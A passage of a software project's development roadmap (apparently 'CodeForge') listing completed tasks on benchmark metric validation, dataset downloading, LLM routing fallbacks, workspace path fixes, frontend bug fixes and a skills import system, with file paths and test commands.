  - Run: `cd /workspaces/CodeForge && go test ./internal/domain/benchmark/ -v`

- [x] (2026-03-16) C.3: Add `ValidMetrics` set and check in `Validate()`
  - File: `internal/domain/benchmark/benchmark.go`
  - Add: `var ValidMetrics = map[string]bool{"llm_judge": true, "functional_test": true, "sparc": true, "trajectory_verifier": true, "correctness": true, "faithfulness": true, "relevance": true, "coherence": true, "fluency": true}`
  - In `Validate()`, after the `len(r.Metrics) == 0` check, add:
    ```go
    for _, m := range r.Metrics {
        if !ValidMetrics[m] {
            return fmt.Errorf("%w: unknown metric %q; valid metrics: llm_judge, functional_test, sparc, trajectory_verifier", domain.ErrValidation, m)
        }
    }
    ```

- [x] (2026-03-16) C.4: Python-side safety net — raise instead of warn for unknown evaluators
  - File: `workers/codeforge/consumer/_benchmark.py` (line 681)
  - Current: `logger.warning("unknown evaluator, skipping", evaluator=name)`
  - Fix: `raise ValueError(f"unknown evaluator/metric: {name!r}. Valid: llm_judge, functional_test, sparc, trajectory_verifier, correctness, faithfulness, relevance, coherence, fluency")`
  - This ensures that even if Go-side validation is bypassed (e.g. direct NATS message), the worker fails cleanly
  - Write test in `workers/tests/test_score_key_normalization.py` or new file:
    `_build_evaluators(["nonexistent_evaluator"], "gpt-4")` → raises `ValueError`

- [x] (2026-03-16) C.5: Remove the "no evaluators" fallback default
  - File: `workers/codeforge/consumer/_benchmark.py` (lines 691-697)
  - Current: `if not evaluators:` → creates a default `LLMJudgeEvaluator`
  - This fallback masks validation failures. After C.3+C.4, it should never be reached.
  - Replace with: `if not evaluators: raise ValueError("no valid evaluators after processing metrics list")`
  - Or remove the fallback entirely (the `raise ValueError` in C.4 will already prevent reaching this code)

##### Issue E: LiveCodeBench — Replace HF HTTP API with `datasets` Library

> **Severity:** Low (workaround exists: `max_tasks: 3`)
> **Root cause:** HuggingFace Datasets Server HTTP API (`datasets-server.huggingface.co/rows`)
> can't serve `livecodebench/code_generation` rows reliably — returns 502/504 for large rows
> even at page_size=10. Current adaptive page_size fallback (100→10→1) works but is extremely
> slow (~12h for 880 rows). Some rows return 500 and are skipped entirely.

- [x] (2026-03-16) E.1: Add `datasets` library to Poetry dependencies
  - File: `workers/pyproject.toml`
  - Add: `datasets = "^3.0"` (HuggingFace datasets library)
  - Run: `cd workers && poetry add datasets`
  - Note: This is a large dependency (~100MB with Apache Arrow). Consider making it optional via extras: `[tool.poetry.extras] hf = ["datasets"]`

- [x] (2026-03-16) E.2: Add `download_hf_dataset_parquet()` alternative in cache module
  - File: `workers/codeforge/evaluation/cache.py`
  - New function: `async def download_hf_dataset_parquet(dataset, split, provider_name, filename, base_dir, config)` that:
    1. Checks cache first (same `get_cached_path()` logic)
    2. Uses `datasets.load_dataset(dataset, config, split=split)` for direct Parquet download
    3. Converts to JSONL and saves to cache directory
    4. Handles `HF_TOKEN` authentication via `datasets.login(token=hf_token)` or `HfFolder.save_token()`
  - This bypasses the HTTP rows API entirely — uses HuggingFace Hub direct download

- [x] (2026-03-16) E.3: Update LiveCodeBench provider to use Parquet download
  - File: `workers/codeforge/evaluation/providers/livecodebench.py`
  - Change `_fetch_tasks()` to call `download_hf_dataset_parquet()` instead of `download_hf_dataset()`
  - Keep `download_hf_dataset()` as fallback for providers that work fine with HTTP API (humaneval, mbpp, bigcodebench, cruxeval)

- [x] (2026-03-16) E.4: Write tests for Parquet download path
  - File: `workers/tests/test_cache_parquet.py`
  - Test: mock `datasets.load_dataset()` → verify JSONL file created with correct records
  - Test: cached file exists → skips download
  - Test: `HF_TOKEN` env var propagated to datasets library
  - Run: `cd workers && poetry run pytest tests/test_cache_parquet.py -v`

#### Evaluation System Improvements — R2E-Gym Cherry-Picks + Categorical Verifier (COMPLETED)

> Three targeted improvements to the Phase 26+28 evaluation pipeline. Python-only, no Go/NATS/frontend changes.

- [x] (2026-03-16) **LogprobVerifierEvaluator (new):** Calibrated ranking via P(YES) logprobs with `max_tokens=1`. Softmax normalization `P(YES) = exp(yes_lp) / (exp(yes_lp) + exp(no_lp))`. Falls back to text parsing when provider doesn't support logprobs. Registered in `_build_evaluators()` + `_DIMENSION_TO_METRIC`. Files: `workers/codeforge/evaluation/evaluators/logprob_verifier.py` (new), `workers/tests/test_logprob_verifier.py` (new, 13 tests), `workers/codeforge/consumer/_benchmark.py`.
- [x] (2026-03-16) **Categorical TrajectoryVerifier:** Replaced unreliable float-based scoring (0.0-1.0) with ACHIEVED/PARTIALLY_ACHIEVED/NOT_ACHIEVED categories (based on RocketEval ICLR 2025, Prometheus ICLR 2024). Same 5 dimensions, same interface, case-insensitive parsing with backward compat for floats. `max_tokens` reduced 256->128. Files: `workers/codeforge/evaluation/evaluators/trajectory_verifier.py`, `workers/tests/test_trajectory_verifier.py` (5 new + 2 updated tests).
- [x] (2026-03-16) **Selection strategies (longest/shortest):** Added trajectory-length-based selection for `MultiRolloutRunner` (from R2E-Gym). `_trajectory_length()` helper with 3-tier fallback (trajectory -> step_count -> actual_output). Zero-cost heuristic when hybrid pipeline unavailable. Files: `workers/codeforge/evaluation/runners/multi_rollout.py`, `workers/tests/test_multi_rollout_runner.py` (7 new tests).
- Total: 48 tests (27 new + 21 existing), 7 files changed (+718/-30 lines)

#### Sidebar Restructure (COMPLETED)
- [x] (2026-03-16) Section grouping, page merges, top bar navigation

#### Loading Animation System (COMPLETED)
- [x] (2026-03-16) 5 primitives: Skeleton (text/rect/circle), TypingIndicator (bouncing dots), StreamingCursor (blink cursor), ProgressBar (determinate/indeterminate), PacmanSpinner (branded SVG)
- [x] (2026-03-16) 4 composites: SkeletonText, SkeletonCard (stat/project), SkeletonTable, SkeletonChat
- [x] (2026-03-16) 7 CSS keyframes: cf-shimmer, cf-blink, cf-bounce-dot, cf-progress-slide, cf-pacman-chomp, cf-dot-orbit, cf-fade-in
- [x] (2026-03-16) Skeleton design tokens (--cf-skeleton-base, --cf-skeleton-shine) for light/dark themes, registered in @theme
- [x] (2026-03-16) ChatPanel: TypingIndicator replaces animate-pulse, StreamingCursor replaces static "Streaming..." label
- [x] (2026-03-16) ResourceGuard: optional `skeleton` prop for custom loading states (backward-compatible)
- Note (2026-03-18): ProgressBar, PacmanSpinner, SkeletonText, SkeletonChat, ResourceGuard and the keyframes cf-progress-slide / cf-pacman-chomp / cf-dot-orbit were removed as unused (c124162e); SkeletonCard and SkeletonTable were restored (47705a3f). Skeleton, TypingIndicator and StreamingCursor remain.

#### Benchmark Metric Validation & Detail Card Fix (COMPLETED)
- [x] (2026-03-16) **Go ValidMetrics allowlist gap:** Frontend offers 5 metrics (`correctness`, `tool_correctness`, `faithfulness`, `answer_relevancy`, `contextual_precision`) but Go `ValidMetrics` only had 9 entries — missing `tool_correctness`, `answer_relevancy`, `contextual_precision`. Runs with all metrics failed HTTP 400. Added 3 missing metrics to `internal/domain/benchmark/benchmark.go:180`. 29 Go tests pass.
- [x] (2026-03-16) **SolidJS event delegation bug in benchmark detail card:** Clicking task rows in `BenchmarkRunDetail` collapsed the parent card because SolidJS delegates all `onClick` to `document` — `stopPropagation()` alone doesn't prevent parent SolidJS handlers. Fixed parent card `onClick` in `BenchmarkPage.tsx:346` with `target.closest("table"|"button"|"a")` guard. Added `stopPropagation()` on task row as defense-in-depth.
- [x] (2026-03-16) **Verified via Playwright MCP** with `lm_studio/qwen/qwen3-30b-a3b`: detail card shows summary scores + task results table, all 3 task rows expand/collapse correctly showing Actual Output and Evaluator Scores.

#### Frontend UI Bug Fixes & i18n (COMPLETED)
- [x] (2026-03-15) **BUG-1 (High) — Broken "Go to Chat" Navigation:** `onNavigate("chat")` silently did nothing — `"chat"` was not a valid `LeftTab`. Created unified `handleNavigate()` in `ProjectDetailPage.tsx` that switches `mobileView` to `"chat"` on mobile. Replaced 8 duplicate inline handlers. Fixed in: `GoalsPanel.tsx:202`, `SessionPanel.tsx:116`, `WarRoom.tsx:90`, `OnboardingProgress.tsx:44`.
- [x] (2026-03-15) **BUG-2 (Medium) — Dead RunPanel Code:** `run.toolcall` WS event was a stub comment. `RunPanel.addToolCall`/`updateRunStatus` attached to component function object but never called. Removed dead code — tool calls are rendered via AG-UI events in `ChatPanel`. Files: `ProjectDetailPage.tsx`, `RunPanel.tsx`.
- [x] (2026-03-15) **BUG-3 (Low) — `window.prompt()` for Folder Creation:** Replaced `window.prompt("New folder name:")` with custom Modal dialog consistent with Create/Rename/Delete modals. New state: `showFolderModal`, `newFolderName`, `newFolderPrefix`. File: `FilePanel.tsx`.
- [x] (2026-03-15) **Monaco Theme Sync:** Editor now reactively follows dark/light theme toggle via `createEffect` + `monaco.editor.setTheme()`. File: `CodeEditor.tsx`.
- [x] (2026-03-15) **File Panel Icon Alignment:** Expand/Collapse-all SVG polyline points centered in 16x16 viewBox. File: `FilePanel.tsx`.
- [x] (2026-03-15) **i18n: ~40 hardcoded strings replaced** across `FilePanel.tsx`, `FileContextMenu.tsx`, `GoalProposalCard.tsx`, `KnowledgeBasesPage.tsx`. 28 new keys in `en.ts` + `de.ts` (`files.*`, `common.approve`, `common.reject`, `detail.tab.files`).
- [x] (2026-03-15) **"Allow Always" Policy Persistence:** `PermissionRequestCard.tsx` TODO resolved. Clicking "Allow Always" now approves the current tool call AND adds an `allow` rule to the project's policy profile via `POST /api/v1/policies/allow-always` (in memory; written to disk only when a policy directory is configured, which `cmd/codeforge/main.go` does not do, see [KI-7](#known-issues)). Preset profiles are cloned to `{preset}-custom-{projectId}` on first use. Rule construction: tool name + first word of command as glob pattern (e.g., `Bash/git*`). Idempotent (duplicate rules detected via `HasRuleForSpecifier`). 26 new tests across domain, service, and HTTP layers. Files: `internal/domain/policy/policy.go`, `internal/service/policy.go`, `internal/service/project.go`, `internal/adapter/http/handlers_policy_crud.go`, `internal/adapter/http/routes.go`, `frontend/src/api/resources/settings.ts`, `frontend/src/features/project/PermissionRequestCard.tsx`, `frontend/src/features/project/ChatPanel.tsx`.

#### Benchmark Live Feed (COMPLETED)
- [x] (2026-03-10) Go: `TrajectoryEventPayload` in `internal/domain/event/broadcast_payloads.go` — enriched WS broadcast with cost, tokens, input, output, step fields
- [x] (2026-03-10) Go: Runtime trajectory subscription handler broadcasts enriched payload
- [x] (2026-03-10) TypeScript: `LiveFeedEvent` + `BenchmarkLiveProgress` types in `api/types.ts`
- [x] (2026-03-10) Frontend: `BenchmarkLiveFeed.tsx` — virtualized auto-scrolling feed with `@tanstack/solid-virtual`, feature accordions, progress header, elapsed timer
- [x] (2026-03-10) Integration: Wired into `BenchmarkPage.tsx` for selected running runs
- Design: `docs/specs/2026-03-10-benchmark-live-feed-design.md`
- Plan: `docs/plans/2026-03-10-benchmark-live-feed-plan.md`

#### Benchmark Live Feed — State Persistence & Density Improvements (COMPLETED)
- [x] (2026-03-16) State persistence: Live feed state lifted from `BenchmarkLiveFeed` to `BenchmarkPage` as `Map<runId, LiveFeedState>` — closing/reopening info card no longer loses state
- [x] (2026-03-16) API hydration: Running runs rehydrate from `GET /runs/{id}/trajectory` + `GET /benchmarks/runs/{id}/results` on page load
- [x] (2026-03-16) `BenchmarkLiveFeed` converted to presentational component (receives `LiveFeedState` props)
- [x] (2026-03-16) Pure functions extracted to `liveFeedState.ts` with 18 unit tests: `formatTokens`, `computeEta`, `agentEventToLiveFeedEvent`, `statsFromSummary`, `resultToFeatureEntry`
- [x] (2026-03-16) Inline stats line: avg score, tokens in/out, tool calls, $/task
- [x] (2026-03-16) Mini score bars on feature rows (green/yellow/red color coding)
- [x] (2026-03-16) ETA display when total_tasks known
- [x] (2026-03-16) Indeterminate progress bar fix for unknown total_tasks
- [x] (2026-03-18) Event dedup: backend `sequence_number` on trajectory events (migration 077, Go eventstore, frontend dedup)
- [x] (2026-03-18) WS reconnect gap: `after_sequence` REST param, frontend gap-fill on reconnect
- Spec: `docs/specs/2026-03-16-benchmark-live-feed-density-design.md`
- Plan: `docs/plans/2026-03-16-benchmark-live-feed-improvements-plan.md`

#### Agent-Eval Benchmark Results (2026-03-10)
- [x] (2026-03-10) Ran `/agent-eval mistral/mistral-large-latest` — auto-agent pipeline end-to-end
- Result: 0/300 total score (Grade F) — Mistral model could not produce code within 43 min
- All skeleton files unchanged — agent stalled on spec reading without invoking Write tool
- Infrastructure verified: workspace paths absolute, project seeding works, test suites collect correctly

#### Test Suites (COMPLETED)
- [x] Browser E2E: 17 Playwright tests (health, navigation, projects, costs, models, a11y)
- [x] LLM E2E: 95 API-level tests across 11 spec files
- [x] Benchmark E2E: 132 browser Playwright tests across 12 spec files
- [x] Benchmark Validation E2E: 22 API-level tests across 7 blocks (`frontend/e2e/benchmark-validation/`)
- [x] Backend E2E: 88 pass / 0 fail / 3 skip (97% pass rate)
- [x] Python unit tests: 134 pass as of 2026-03-16 (107 prior + 27 new from evaluation improvements); the suite has since grown to ~140 test files / ~2,400 test functions

#### Chat Enhancements (COMPLETED)
- [x] (2026-03-10) Phase 1: HITL permission UI + `supervised-ask-all` preset + autonomy-to-preset mapping
- [x] (2026-03-10) Phase 2: Inline diff review with DiffPreview component + file content endpoint
- [x] (2026-03-10) Phase 3: Action buttons (copy, retry, apply, view diff) on agent messages
- [x] (2026-03-10) Phase 4: Per-message cost tracking with MessageBadge + CostBreakdown
- [x] (2026-03-10) Phase 5: Smart references with @/#// autocomplete popover + frequency tracker
- [x] (2026-03-10) Phase 6: Slash commands (/compact, /rewind, /clear, /help, /mode, /model)
- [x] (2026-03-10) Phase 7: Conversation full-text search with PostgreSQL FTS (GIN index, ts_rank)
- [x] (2026-03-10) Phase 8: Notification center with browser push, sound, tab badge, AG-UI wiring
- [x] (2026-03-10) Phase 9: Real-time channels with threads, domain model, sidebar integration (channel WS events are never broadcast, see [KI-42](#known-issues))
- [x] (2026-03-10) Phase 10+11: Feature spec + documentation updates
- Feature spec: [docs/features/05-chat-enhancements.md](features/05-chat-enhancements.md)

#### Subscription Provider Integration (COMPLETED)
- [x] (2026-03-10) OAuth device flow adapters: Anthropic (Claude Max) + GitHub Copilot
- [x] (2026-03-10) Atomic EnvWriter service for .env file management
- [x] (2026-03-10) Subscription orchestration service (background polling, token exchange, .env persistence)
- [x] (2026-03-10) HTTP endpoints: list/connect/status/disconnect providers
- [x] (2026-03-10) Python routing: github_copilot in key_filter, router tiers, meta_router tiers
- [x] (2026-03-10) LiteLLM config: extra_headers for github_copilot
- [x] (2026-03-10) Frontend: Subscription Providers section in SettingsPage with device flow UI
- [x] (2026-03-10) Tests: 22 auth adapter tests, 9 envwriter tests, 8 subscription tests, 48 Python routing tests

---

### E2E Playwright Test Findings (2026-03-09)

> 5 findings from interactive end-to-end Playwright MCP test of full agent evaluation workflow.

#### F4: Workspace Path Resolution Bug (Priority: CRITICAL)

> Python worker resolves workspace paths relative to its own CWD (`workers/`) instead of the
> project root. Agent tools write files to `workers/data/workspaces/.../data/workspaces/.../`
> (doubled path). This blocks ALL agent file operations end-to-end.

- [x] F4.1: Add integration test reproducing the bug (2026-03-09) — create a project, seed a file via API, then call `resolve_safe_path("data/workspaces/{tid}/{pid}", "lru_cache.py")` and assert the resolved path matches the actual file on disk
  - File: `workers/tests/test_workspace_path_resolution.py`
  - Run: `cd workers && poetry run pytest tests/test_workspace_path_resolution.py -v`
  - Expected: FAIL (confirms bug exists)

- [x] F4.2: Fix workspace path — Go `NewProjectService` resolves to absolute via `filepath.Abs()` (2026-03-09)
  - File: `workers/codeforge/tools/_base.py:64`
  - Current: `workspace = Path(workspace_path).resolve()` — resolves relative to CWD
  - Fix option A (preferred): Make Go Core send **absolute** paths in NATS payload — change `proj.WorkspacePath` to `filepath.Join(cfg.DataDir, proj.WorkspacePath)` before publishing
    - File: `internal/service/conversation_agent.go:255,433,698`
    - Also update: `internal/service/auto_agent.go` (wherever it publishes workspace_path)
  - Fix option B (fallback): In Python `_base.py`, detect relative paths and resolve against a known `CODEFORGE_ROOT` env var
    - File: `workers/codeforge/tools/_base.py:64`
    - Change: `workspace = Path(workspace_path) if Path(workspace_path).is_absolute() else (Path(os.environ.get("CODEFORGE_ROOT", "/workspaces/CodeForge")) / workspace_path)`

- [x] F4.3: Fix `bash.py` tool CWD — automatically fixed by F4.2 (absolute paths from Go) (2026-03-09)
  - File: `workers/codeforge/tools/bash.py:81`
  - Current: `cwd=workspace_path` (relative → wrong CWD)
  - Fix: Same as F4.2 — if Go sends absolute path, this is automatically fixed

- [x] F4.4: Add Go workspace path tests — 3 tests in `project_workspace_test.go` (2026-03-09)
  - File: `internal/port/messagequeue/contract_test.go` (add assertion)
  - File: `workers/tests/test_nats_contracts.py` (add assertion)
  - Rule: `workspace_path` must start with `/` in all `conversation.run.start` payloads

- [x] F4.5: Integration tests passing (2026-03-09)
  - Run: `cd workers && poetry run pytest tests/test_workspace_path_resolution.py -v`
  - Expected: PASS

- [x] (2026-03-10) F4.6: Re-run agent-eval to verify end-to-end fix — workspace paths are absolute (verified), but Mistral model scored 0/300 (agent stalled, never wrote code in 43 min)
  - Run: `/agent-eval mistral/mistral-large-latest`
  - Result: 0/3 features completed, 1 failed, agent timed out after 43 min
  - Root cause: Mistral free-tier rate limiting + model unable to invoke Write tool correctly
  - Workspace path fix (F4.2) confirmed working — paths are absolute in NATS payloads

#### F3: Routing Does Not Fallback on Provider Billing Errors (Priority: HIGH)

> When Anthropic credits are exhausted, the router selected `anthropic/claude-sonnet-4` and
> failed without trying another provider. Rate tracker only handles 429 (rate limit), not
> 401/402/billing errors.

- [x] F3.1: Add test for billing/auth error classification (2026-03-09)
  - File: `workers/tests/test_routing_error_classification.py` (billing/auth exhaustion and cooldown tests; no standalone `test_routing_rate_tracker.py`)
  - Test: Call `rate_tracker.record_error("anthropic", error_type="billing")` → `is_exhausted("anthropic")` returns `True`
  - Test: Call `rate_tracker.record_error("anthropic", error_type="auth")` → `is_exhausted("anthropic")` returns `True`
  - Run: `cd workers && poetry run pytest tests/test_routing_error_classification.py -v`

- [x] F3.2: Add `record_error()` to `RateLimitTracker` with billing/auth cooldowns (2026-03-09)
  - File: `workers/codeforge/routing/rate_tracker.py`
  - Add: `record_error(provider, error_type)` method that marks provider as exhausted for longer duration (e.g. 1 hour for billing, 5 min for auth)
  - Billing/auth errors should mark provider exhausted with longer cooldown than rate limits

- [x] F3.3: Add `classify_error_type()` in `llm.py` wired into `_with_retry` (2026-03-09)
  - File: `workers/codeforge/llm.py`
  - Parse LiteLLM exceptions: `AuthenticationError` → "auth", `BudgetExceededError` / status 402 → "billing", `RateLimitError` → "rate_limit"
  - Feed classification to rate tracker on failure

- [x] (2026-03-09) F3.4: Add retry-with-fallback in agent loop LLM call path
  - File: `workers/codeforge/agent_loop.py`
  - Wired `classify_error_type()` + `get_tracker().record_error()` into `_try_model_fallback`
  - Provider extracted from model string (e.g., "anthropic" from "anthropic/claude-sonnet-4")

- [x] (2026-03-09) F3.5: Enable routing by default when multiple providers are configured
  - File: `internal/config/config.go` — `Defaults()` now sets `Routing.Enabled: true`
  - Override: `CODEFORGE_ROUTING_ENABLED=false` or YAML `routing.enabled: false`

- [x] (2026-03-10) F3.6: E2E test verifying full routing fallback chain — 6/6 tests pass
  - File: `workers/tests/test_routing_fallback_e2e.py`
  - Tests: billing error classification, fallback chain filtering, agent loop model fallback, all fallbacks exhausted, auth error trigger, rate limit short cooldown
  - Run: `cd workers && poetry run pytest tests/test_routing_fallback_e2e.py -v`

#### F6: Tool-Message Format Incompatibility on Mid-Conversation Model Switch (Priority: HIGH)

> When `_RoutingLLMWrapper` routes to different models per-iteration within the same agent loop
> (e.g. Gemini → Groq), the message history accumulates tool-result messages in one provider's
> format that the new provider rejects. Groq requires `content` on `role:tool` messages, but
> Gemini may omit it.
>
> Error: `'messages.3' : for 'role:tool' the following must be satisfied[('messages.3.content' : property 'content' is missing)]`

- [x] (2026-03-10) F6.1: Add test reproducing tool-message format rejection on model switch — 12 tests
  - File: `workers/tests/test_tool_message_compat.py`
  - Tests: empty content, missing content, None content, missing tool_call_id, mixed messages, routing wrapper sanitization
  - Run: `cd workers && poetry run pytest tests/test_tool_message_compat.py -v`

- [x] (2026-03-10) F6.2: Add `sanitize_tool_messages()` normalizer in `agent_loop.py`
  - File: `workers/codeforge/loop_helpers.py` (moved out of `agent_loop.py` in the 2026-03-24 decomposition)
  - Ensures all `role:tool` messages have `content` (defaults to `""`) and `tool_call_id`
  - Also fixed `_payload_to_dict()` to always include `content` for `role:tool` messages

- [x] (2026-03-10) F6.3: Wire sanitizer into `_RoutingLLMWrapper` and `AgentLoopExecutor`
  - File: `workers/codeforge/consumer/_benchmark.py` — `_RoutingLLMWrapper._sanitize_messages()` called before forwarding
  - File: `workers/codeforge/agent_loop.py` — `sanitize_tool_messages(messages)` called before `chat_completion_stream`

- [x] (2026-03-10) F6.4: Integration test — routing wrapper with tool message sanitization
  - File: `workers/tests/test_tool_message_compat.py` (`TestSanitizeWiredIntoLLMCall`)
  - Verifies `_RoutingLLMWrapper` sanitizes messages before forwarding to real LLM

#### F7: 429 Rate-Limit Should Trigger Immediate Model Fallback (Priority: HIGH)

> The `_with_retry` logic in `llm.py` retries the same rate-limited model 2 times with
> exponential backoff (20s + 58s waits) before failing, instead of immediately switching
> to a fallback model. This wastes ~78+ seconds per task on exhausted providers (e.g.
> Gemini free-tier 20 req/min limit).
>
> Expected: On first 429, immediately try the next fallback model from the routing plan.
> Current: Retries same exhausted model 2x, then fails the entire call.

- [x] (2026-03-10) F7.1: Add test for immediate-fallback-on-429 behavior — 8 tests
  - File: `workers/tests/test_llm_retry_fallback.py`
  - Tests: 429 raises immediately (no retry), 502/503/504 still retried, model fallback on 429, fallback chain exhausted, 429 total time <2s, rate tracker integration
  - Run: `cd workers && poetry run pytest tests/test_llm_retry_fallback.py -v`

- [x] (2026-03-10) F7.2: Remove 429 from `retryable_codes` in `LLMClientConfig`
  - File: `workers/codeforge/llm.py` (line 184)
  - Changed: `retryable_codes` from `(429, 502, 503, 504)` to `(502, 503, 504)`
  - 429 now propagates immediately to agent loop's `_try_model_fallback` which switches models
  - No refactoring of `_with_retry` needed — existing agent loop fallback logic handles everything

- [x] (2026-03-10) F7.3: No additional wiring needed
  - Agent loop's `_handle_llm_error` → `_try_model_fallback` → `_pick_next_fallback` already handles model switching via `LoopConfig.fallback_models`
  - The fix in F7.2 (removing 429 from retryable) is sufficient to trigger this existing path

- [x] (2026-03-10) F7.4: Integration tests verify full fallback chain
  - File: `workers/tests/test_llm_retry_fallback.py` (`TestFallbackChain`, `TestRateLimitTrackerIntegration`)
  - 429 resolves to fallback model in <2s, rate tracker records exhausted providers

#### F1: No File Upload/Create in Project UI (Priority: MEDIUM)

> FilePanel only displays files — no buttons to create, upload, or edit files.
> Users must use the REST API as workaround.

- [x] F1.1: Add i18n keys for file management actions (2026-03-09)
  - File: `frontend/src/i18n/en.ts`
  - Keys: `files.createFile`, `files.uploadFile`, `files.fileName`, `files.fileContent`, `files.createSuccess`, `files.uploadSuccess`, `files.createFailed`
  - File: `frontend/src/i18n/locales/de.ts` (German translations)

- [x] F1.2: Add "Create File" button and modal to FilePanel (2026-03-09)
  - File: `frontend/src/features/project/FilePanel.tsx`
  - Add: Button in the file tree header (+ icon or "New File" text)
  - Add: Modal with `path` (text input) and `content` (textarea) fields
  - Call: `api.files.write(projectId, path, content)` on submit
  - Show: toast on success/error

- [x] (2026-03-09) F1.3: Add "Upload File" button with native file picker
  - File: `frontend/src/features/project/FilePanel.tsx`
  - Upload button with SVG icon in SidebarHeader, hidden `<input type="file">`, FileReader handler
  - Calls `api.files.write()`, shows toast, opens uploaded file in editor

- [x] (2026-03-10) F1.4: Playwright E2E tests for file creation — 4/4 pass
  - File: `frontend/e2e/file-crud.spec.ts`
  - Tests: create file via API + verify in file tree, read back content, overwrite replaces content, special characters in name
  - Run: `cd frontend && npx playwright test file-crud.spec.ts`

#### F2: No Feature Description Field in Create/Edit Modal (Priority: MEDIUM)

> FeatureCardForm only has a title input — no description/body textarea.
> Feature descriptions are critical for agent consumption (contain full problem specs).

- [x] F2.1: Add i18n key `featuremap.descriptionPlaceholder` (2026-03-09)
  - File: `frontend/src/i18n/en.ts`
  - Keys: `featuremap.description`, `featuremap.descriptionPlaceholder`
  - File: `frontend/src/i18n/locales/de.ts`

- [x] F2.2: Description wired into create/update API calls (2026-03-09)
  - File: `frontend/src/api/client.ts` (around line 1170)
  - Check: Does `api.roadmap.createFeature()` accept a `description` field? If not, add it.
  - Check: Does `api.roadmap.updateFeature()` accept a `description` field? If not, add it.

- [x] F2.3: Add description textarea to FeatureCardForm (2026-03-09)
  - File: `frontend/src/features/project/featuremap/FeatureCardForm.tsx`
  - Add: `const [description, setDescription] = createSignal(props.feature?.description ?? "");`
  - Add: `<textarea>` between the title input and status selector
  - Pass: `description` to `createFeature()` and `updateFeature()` calls (lines 48, 41)
  - Style: Match existing form patterns (rounded-cf-sm, border-cf-border, p-2)

- [x] (2026-03-10) F2.4: Playwright E2E tests for feature descriptions — 4/4 pass
  - File: `frontend/e2e/feature-description.spec.ts`
  - Tests: create with description, update persists changes, visible in project UI, empty description allowed
  - Run: `cd frontend && npx playwright test feature-description.spec.ts`

#### F5: Playwright MCP Session Not Recoverable After Container Restart (Priority: LOW)

> After `docker restart codeforge-playwright`, the MCP session ID becomes stale.
> All subsequent browser_* calls return "Session not found".

- [x] F5.1: Document Playwright MCP session limitation (2026-03-09, commit 197557c)
  - File: `docs/dev-setup.md`
  - Add section: "Playwright MCP Container" with note that session is lost on restart
  - Workaround: Restart the Claude Code session (or MCP client) after container restart

- [x] F5.2: Add health check to Playwright Docker service (2026-03-09, commit 197557c)
  - File: `docker-compose.yml`
  - Add: `healthcheck` to `codeforge-playwright` service (test: HTTP GET to :8001/mcp)
  - Ensures container is only "healthy" when MCP server is accepting connections

---

### Auto-Agent Skills System (Phase 31)

> Design: [docs/specs/2026-03-09-auto-agent-skills-design.md](specs/2026-03-09-auto-agent-skills-design.md)
> Plan: [docs/plans/2026-03-09-auto-agent-skills-plan.md](plans/2026-03-09-auto-agent-skills-plan.md)
> Goal: Auto-agent automatically selects and uses relevant skills via LLM, with multi-format import, agent-generated skills, and prompt injection protection.

#### Task 1: DB Migration — Extend skills table (Priority: CRITICAL)
- [x] T1.1: Write migration 067 — add type, source, source_url, format_origin, status, usage_count, content columns (2026-03-09)
  - File: `internal/adapter/postgres/migrations/067_extend_skills.sql`
  - Includes: check constraints, status index, data migration (code → content)
- [x] T1.2: Verify migration applies cleanly (2026-03-09)
- [x] T1.3: Commit (2026-03-09)

#### Task 2: Go Domain Model — Extend Skill struct (Priority: CRITICAL)
- [x] T2.1: Write failing tests for new fields and validation (content required, invalid type, valid workflow, status/source constants) (2026-03-09)
  - File: `internal/domain/skill/skill_test.go`
- [x] T2.2: Implement extended Skill struct with Type, Source, SourceURL, FormatOrigin, Status, UsageCount, Content fields (2026-03-09)
  - File: `internal/domain/skill/skill.go`
- [x] T2.3: Run tests — all pass (2026-03-09)
- [x] T2.4: Commit (2026-03-09)

#### Task 3: Go Postgres Store — Update SQL queries (Priority: CRITICAL)
- [x] T3.1: Add `IncrementSkillUsage` and `ListActiveSkills` to store interface (2026-03-09)
  - File: `internal/port/database/store.go`
- [x] T3.2: Update all SQL queries in store for new columns, status-based filtering (2026-03-09)
  - File: `internal/adapter/postgres/store_skill.go`
- [x] T3.3: Run existing store tests — backwards compat passes (2026-03-09)
- [x] T3.4: Commit (2026-03-09)

#### Task 4: Go Service — Update SkillService (Priority: HIGH)
- [x] T4.1: Update Create (defaults: type=pattern, source=user, status=active), Update (handle status), List (active-only) (2026-03-09)
  - File: `internal/service/skill.go`
- [x] T4.2: Run tests — pass (2026-03-09)
- [x] T4.3: Commit (2026-03-09)

#### Task 5: Python Model — Extend Pydantic Skill (Priority: CRITICAL)
- [x] T5.1: Write tests for new fields and defaults (2026-03-09)
  - File: `workers/tests/test_skill_models.py`
- [x] T5.2: Update Pydantic Skill model with type, source, status, format_origin, usage_count, content, source_url (2026-03-09)
  - File: `workers/codeforge/skills/models.py`
- [x] T5.3: Run tests — all pass (2026-03-09)
- [x] T5.4: Commit (2026-03-09)

#### Task 6: Quarantine Scorer — Add prompt injection patterns (Priority: HIGH)
- [x] T6.1: Write failing tests for prompt override, role hijack, exfiltration detection (2026-03-09)
  - File: `internal/domain/quarantine/scorer_test.go`
- [x] T6.2: Add 3 new regex patterns (promptOverridePattern, roleHijackPattern, exfilPattern) and scoring blocks (2026-03-09)
  - File: `internal/domain/quarantine/scorer.go`
- [x] T6.3: Run all quarantine tests — all pass (2026-03-09)
- [x] T6.4: Commit (2026-03-09)

#### Task 7: Python Format Parsers — Multi-format skill import (Priority: HIGH)
- [x] T7.1: Write tests for CodeForge YAML, Claude Skills, Cursor Rules, plain Markdown, .mdc, unknown format (2026-03-09)
  - File: `workers/tests/test_skill_parsers.py`
- [x] T7.2: Implement `parse_skill_file()` with format detection and 4 parsers (2026-03-09)
  - File: `workers/codeforge/skills/parsers.py`
- [x] T7.3: Run tests — all pass (2026-03-09)
- [x] T7.4: Commit (2026-03-09)

#### Task 8: Python Skill Selector — LLM-based pre-loop selection (Priority: CRITICAL)
- [x] T8.1: Write tests for `resolve_skill_selection_model()` (cheapest, fallback) and `select_skills_for_task()` (LLM match, BM25 fallback) (2026-03-09)
  - File: `workers/tests/test_skill_selector.py`
- [x] T8.2: Implement selector with LLM selection + BM25 fallback + design decision docs (2026-03-09)
  - File: `workers/codeforge/skills/selector.py`
- [x] T8.3: Run tests — all pass (2026-03-09)
- [x] T8.4: Commit (2026-03-09)

#### Task 9: Python `search_skills` Tool (Priority: HIGH)
- [x] T9.1: Write tests for BM25 search, empty results, type filtering (2026-03-09)
  - File: `workers/tests/test_tool_search_skills.py`
